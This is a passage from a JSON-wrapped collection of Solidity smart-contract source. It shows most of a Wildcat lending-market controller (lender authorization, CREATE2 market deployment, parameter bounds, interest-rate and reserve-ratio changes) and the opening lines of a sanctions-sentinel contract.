authorizeLenders(address[] memory lenders) external onlyBorrower {\n    for (uint256 i = 0; i < lenders.length; i++) {\n      address lender = lenders[i];\n      if (_authorizedLenders.add(lender)) {\n        emit LenderAuthorized(lender);\n      }\n    }\n  }\n\n  /**\n   * @dev Revoke authorization for a set of lenders.\n   *\n   *      Note: Only updates the internal set of approved lenders.\n   *      Must call `updateLenderAuthorization` to apply changes\n   *      to existing market accounts\n   */\n  function deauthorizeLenders(address[] memory lenders) external onlyBorrower {\n    for (uint256 i = 0; i < lenders.length; i++) {\n      address lender = lenders[i];\n      if (_authorizedLenders.remove(lender)) {\n        emit LenderDeauthorized(lender);\n      }\n    }\n  }\n\n  /**\n   * @dev Update lender authorization for a set of markets to the current\n   *      status.\n   */\n  function updateLenderAuthorization(address lender, address[] memory markets) external {\n    for (uint256 i; i < markets.length; i++) {\n      address market = markets[i];\n      if (!_controlledMarkets.contains(market)) {\n        revert NotControlledMarket();\n      }\n      WildcatMarket(market).updateAccountAuthorization(lender, _authorizedLenders.contains(lender));\n    }\n  }\n\n  /* -------------------------------------------------------------------------- */\n  /*                                Market Queries                               */\n  /* -------------------------------------------------------------------------- */\n\n  function isControlledMarket(address market) external view returns (bool) {\n    return _controlledMarkets.contains(market);\n  }\n\n  function getControlledMarkets() external view returns (address[] memory) {\n    return _controlledMarkets.values();\n  }\n\n  function getControlledMarkets(\n    uint256 start,\n    uint256 end\n  ) external view returns (address[] memory arr) {\n    uint256 len = _controlledMarkets.length();\n    end = MathUtils.min(end, len);\n    uint256 count = end - start;\n    arr = new address[](count);\n    for (uint256 i = 0; i < count; i++) {\n      arr[i] = _controlledMarkets.at(start + i);\n    }\n  }\n\n  function getControlledMarketsCount() external view returns (uint256) {\n    return _controlledMarkets.length();\n  }\n\n  function computeMarketAddress(\n    address asset,\n    string memory namePrefix,\n    string memory symbolPrefix\n  ) external view returns (address) {\n    bytes32 salt = _deriveSalt(asset, namePrefix, symbolPrefix);\n    return LibStoredInitCode.calculateCreate2Address(ownCreate2Prefix, salt, marketInitCodeHash);\n  }\n\n  /* -------------------------------------------------------------------------- */\n  /*                              Market Deployment                              */\n  /* -------------------------------------------------------------------------- */\n\n  /**\n   * @dev Get the temporarily stored market parameters for a market that is\n   *      currently being deployed.\n   */\n  function getMarketParameters() external view returns (MarketParameters memory parameters) {\n    parameters.asset = _tmpMarketParameters.asset;\n    parameters.namePrefix = _tmpMarketParameters.namePrefix;\n    parameters.symbolPrefix = _tmpMarketParameters.symbolPrefix;\n    parameters.borrower = borrower;\n    parameters.controller = address(this);\n    parameters.feeRecipient = _tmpMarketParameters.feeRecipient;\n    parameters.sentinel = sentinel;\n    parameters.maxTotalSupply = _tmpMarketParameters.maxTotalSupply;\n    parameters.protocolFeeBips = _tmpMarketParameters.protocolFeeBips;\n    parameters.annualInterestBips = _tmpMarketParameters.annualInterestBips;\n    parameters.delinquencyFeeBips = _tmpMarketParameters.delinquencyFeeBips;\n    parameters.withdrawalBatchDuration = _tmpMarketParameters.withdrawalBatchDuration;\n    parameters.reserveRatioBips = _tmpMarketParameters.reserveRatioBips;\n    parameters.delinquencyGracePeriod = _tmpMarketParameters.delinquencyGracePeriod;\n  }\n\n  function _resetTmpMarketParameters() internal {\n    _tmpMarketParameters.asset = address(1);\n    _tmpMarketParameters.namePrefix = '_';\n    _tmpMarketParameters.symbolPrefix = '_';\n    _tmpMarketParameters.feeRecipient = address(1);\n    _tmpMarketParameters.protocolFeeBips = 1;\n    _tmpMarketParameters.maxTotalSupply = 1;\n    _tmpMarketParameters.annualInterestBips = 1;\n    _tmpMarketParameters.delinquencyFeeBips = 1;\n    _tmpMarketParameters.withdrawalBatchDuration = 1;\n    _tmpMarketParameters.reserveRatioBips = 1;\n    _tmpMarketParameters.delinquencyGracePeriod = 1;\n  }\n\n  /**\n   * @dev Deploys a create2 deployment of `WildcatMarket` unique to the\n   *      combination of `asset, namePrefix, symbolPrefix` and registers\n   *      it with the arch-controller.\n   *\n   *      If a market has already been deployed with these parameters,\n   *      reverts with `MarketAlreadyDeployed`.\n   *\n   *      If `msg.sender` is not `borrower` or `controllerFactory`,\n   *      reverts with `CallerNotBorrowerOrControllerFactory`.\n   *\n   *\t    If `msg.sender == borrower && !archController.isRegisteredBorrower(msg.sender)`,\n   *\t\t  reverts with `NotRegisteredBorrower`.\n   *\n   *      If called by `controllerFactory`, skips borrower check.\n   *\n   *      If either string is empty, reverts with `EmptyString`.\n   *\n   *      If `originationFeeAmount` returned by controller factory is not zero,\n   *      transfers `originationFeeAmount` of `originationFeeAsset` from\n   *      `msg.sender` to `feeRecipient`.\n   */\n  function deployMarket(\n    address asset,\n    string memory namePrefix,\n    string memory symbolPrefix,\n    uint128 maxTotalSupply,\n    uint16 annualInterestBips,\n    uint16 delinquencyFeeBips,\n    uint32 withdrawalBatchDuration,\n    uint16 reserveRatioBips,\n    uint32 delinquencyGracePeriod\n  ) external returns (address market) {\n    if (msg.sender == borrower) {\n      if (!archController.isRegisteredBorrower(msg.sender)) {\n        revert NotRegisteredBorrower();\n      }\n    } else if (msg.sender != address(controllerFactory)) {\n      revert CallerNotBorrowerOrControllerFactory();\n    }\n\n    enforceParameterConstraints(\n      namePrefix,\n      symbolPrefix,\n      annualInterestBips,\n      delinquencyFeeBips,\n      withdrawalBatchDuration,\n      reserveRatioBips,\n      delinquencyGracePeriod\n    );\n\n    TmpMarketParameterStorage memory parameters = TmpMarketParameterStorage({\n      asset: asset,\n      namePrefix: namePrefix,\n      symbolPrefix: symbolPrefix,\n      feeRecipient: address(0),\n      maxTotalSupply: maxTotalSupply,\n      protocolFeeBips: 0,\n      annualInterestBips: annualInterestBips,\n      delinquencyFeeBips: delinquencyFeeBips,\n      withdrawalBatchDuration: withdrawalBatchDuration,\n      reserveRatioBips: reserveRatioBips,\n      delinquencyGracePeriod: delinquencyGracePeriod\n    });\n\n    address originationFeeAsset;\n    uint80 originationFeeAmount;\n    (\n      parameters.feeRecipient,\n      originationFeeAsset,\n      originationFeeAmount,\n      parameters.protocolFeeBips\n    ) = controllerFactory.getProtocolFeeConfiguration();\n\n    _tmpMarketParameters = parameters;\n\n    if (originationFeeAsset != address(0)) {\n      originationFeeAsset.safeTransferFrom(borrower, parameters.feeRecipient, originationFeeAmount);\n    }\n\n    bytes32 salt = _deriveSalt(asset, namePrefix, symbolPrefix);\n    market = LibStoredInitCode.calculateCreate2Address(ownCreate2Prefix, salt, marketInitCodeHash);\n    if (market.codehash != bytes32(0)) {\n      revert MarketAlreadyDeployed();\n    }\n    LibStoredInitCode.create2WithStoredInitCode(marketInitCodeStorage, salt);\n\n    archController.registerMarket(market);\n    _controlledMarkets.add(market);\n\n    _resetTmpMarketParameters();\n  }\n\n  /**\n   * @dev Derive create2 salt for a market given the asset address,\n   *      name prefix and symbol prefix.\n   *\n   *      The salt is unique to each market deployment in the controller,\n   *      so only one market can be deployed for each combination of `asset`,\n   *      `namePrefix` and `symbolPrefix`\n   */\n  function _deriveSalt(\n    address asset,\n    string memory namePrefix,\n    string memory symbolPrefix\n  ) internal pure returns (bytes32 salt) {\n    assembly {\n      // Cache free memory pointer\n      let freeMemoryPointer := mload(0x40)\n      // `keccak256(abi.encode(asset, keccak256(namePrefix), keccak256(symbolPrefix)))`\n      mstore(0x00, asset)\n      mstore(0x20, keccak256(add(namePrefix, 32), mload(namePrefix)))\n      mstore(0x40, keccak256(add(symbolPrefix, 32), mload(symbolPrefix)))\n      salt := keccak256(0, 0x60)\n      // Restore free memory pointer\n      mstore(0x40, freeMemoryPointer)\n    }\n  }\n\n  /**\n   * @dev Enforce constraints on market parameters, ensuring that\n   *      `annualInterestBips`, `delinquencyFeeBips`, `withdrawalBatchDuration`,\n   *      `reserveRatioBips` and `delinquencyGracePeriod` are within the\n   *      allowed ranges and that `namePrefix` and `symbolPrefix` are not null.\n   */\n  function enforceParameterConstraints(\n    string memory namePrefix,\n    string memory symbolPrefix,\n    uint16 annualInterestBips,\n    uint16 delinquencyFeeBips,\n    uint32 withdrawalBatchDuration,\n    uint16 reserveRatioBips,\n    uint32 delinquencyGracePeriod\n  ) internal view virtual {\n    assembly {\n      if or(iszero(mload(namePrefix)), iszero(mload(symbolPrefix))) {\n        // revert EmptyString();\n        mstore(0x00, 0xecd7b0d1)\n        revert(0x1c, 0x04)\n      }\n    }\n    assertValueInRange(\n      annualInterestBips,\n      MinimumAnnualInterestBips,\n      MaximumAnnualInterestBips,\n      AnnualInterestBipsOutOfBounds.selector\n    );\n    assertValueInRange(\n      delinquencyFeeBips,\n      MinimumDelinquencyFeeBips,\n      MaximumDelinquencyFeeBips,\n      DelinquencyFeeBipsOutOfBounds.selector\n    );\n    assertValueInRange(\n      withdrawalBatchDuration,\n      MinimumWithdrawalBatchDuration,\n      MaximumWithdrawalBatchDuration,\n      WithdrawalBatchDurationOutOfBounds.selector\n    );\n    assertValueInRange(\n      reserveRatioBips,\n      MinimumReserveRatioBips,\n      MaximumReserveRatioBips,\n      ReserveRatioBipsOutOfBounds.selector\n    );\n    assertValueInRange(\n      delinquencyGracePeriod,\n      MinimumDelinquencyGracePeriod,\n      MaximumDelinquencyGracePeriod,\n      DelinquencyGracePeriodOutOfBounds.selector\n    );\n  }\n\n  /**\n   * @dev Returns immutable constraints on market parameters that\n   *      the controller variant will enforce.\n   */\n  function getParameterConstraints()\n    external\n    view\n    returns (MarketParameterConstraints memory constraints)\n  {\n    constraints.minimumDelinquencyGracePeriod = MinimumDelinquencyGracePeriod;\n    constraints.maximumDelinquencyGracePeriod = MaximumDelinquencyGracePeriod;\n    constraints.minimumReserveRatioBips = MinimumReserveRatioBips;\n    constraints.maximumReserveRatioBips = MaximumReserveRatioBips;\n    constraints.minimumDelinquencyFeeBips = MinimumDelinquencyFeeBips;\n    constraints.maximumDelinquencyFeeBips = MaximumDelinquencyFeeBips;\n    constraints.minimumWithdrawalBatchDuration = MinimumWithdrawalBatchDuration;\n    constraints.maximumWithdrawalBatchDuration = MaximumWithdrawalBatchDuration;\n    constraints.minimumAnnualInterestBips = MinimumAnnualInterestBips;\n    constraints.maximumAnnualInterestBips = MaximumAnnualInterestBips;\n  }\n\n  /**\n   * @dev Modify the interest rate for a market.\n   * If the new interest rate is lower than the current interest rate,\n   * the reserve ratio is set to 90% for the next two weeks.\n   */\n  function setAnnualInterestBips(\n    address market,\n    uint16 annualInterestBips\n  ) external virtual onlyBorrower onlyControlledMarket(market) {\n    // If borrower is reducing the interest rate, increase the reserve\n    // ratio for the next two weeks.\n    if (annualInterestBips < WildcatMarket(market).annualInterestBips()) {\n      TemporaryReserveRatio storage tmp = temporaryExcessReserveRatio[market];\n\n      if (tmp.expiry == 0) {\n        tmp.reserveRatioBips = uint128(WildcatMarket(market).reserveRatioBips());\n\n        // Require 90% liquidity coverage for the next 2 weeks\n        WildcatMarket(market).setReserveRatioBips(9000);\n      }\n\n      tmp.expiry = uint128(block.timestamp + 2 weeks);\n    }\n\n    WildcatMarket(market).setAnnualInterestBips(annualInterestBips);\n  }\n\n  function resetReserveRatio(address market) external virtual {\n    TemporaryReserveRatio memory tmp = temporaryExcessReserveRatio[market];\n    if (tmp.expiry == 0) {\n      revertWithSelector(AprChangeNotPending.selector);\n    }\n    if (block.timestamp < tmp.expiry) {\n      revertWithSelector(ExcessReserveRatioStillActive.selector);\n    }\n\n    WildcatMarket(market).setReserveRatioBips(uint256(tmp.reserveRatioBips).toUint16());\n    delete temporaryExcessReserveRatio[market];\n  }\n\n  function assertValueInRange(\n    uint256 value,\n    uint256 min,\n    uint256 max,\n    bytes4 errorSelector\n  ) internal pure {\n    assembly {\n      if or(lt(value, min), gt(value, max)) {\n        mstore(0, errorSelector)\n        revert(0, 4)\n      }\n    }\n  }\n}"
    },
    {
      "filename": "src/WildcatSanctionsSentinel.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity >=0.8.20;\n\nimport { IChainalysisSanctionsList } from './interfaces/IChainalysisSanctionsList.sol';\nimport { IWildcatArchController } from './interfaces/IWildcatArchController.sol';\nimport { IWildcatSanctionsSentinel } from './interfaces/IWildcatSanctionsSentinel.sol';\nimport { SanctionsList } from './libraries/Chainalysis.sol';\nimport { WildcatSanctionsEscrow } from './WildcatSanctionsEscrow.sol';\n\ncontract WildcatSanctionsSentinel is IWildcatSanctionsSentinel {\n  bytes32 public constant override WildcatSanctionsEscrowInitcodeHash =\n    keccak256(type(WildcatSanctionsEscrow).creationCode);\n\n  address public immutable override chainalysisSanctionsList;\n\n  address public immutable override archController;\n\n  TmpEscrowParams public override tmpEscrowParams;\n\n  mapping(address borrower => mapping(address acc"
    }
  ]
}